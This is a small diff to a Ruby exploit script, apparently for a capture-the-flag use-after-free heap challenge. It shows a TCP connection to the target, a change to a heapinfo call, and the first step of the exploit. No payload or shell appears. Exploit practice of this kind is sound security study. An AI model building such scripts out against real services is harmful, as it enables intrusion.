@@ -6,7 +6,7 @@ $HOST, $PORT = '', 12345
 $local = false
 ($HOST = '0'; $local = true) if ARGV.empty?
 z=TCPSocket.new $HOST, $PORT
-h = heapinfo('./uaf')
+h = heapinfo('uaf')
 # ==================== Exploit Start ==================== #
 z.puts 1 # new Benz
 
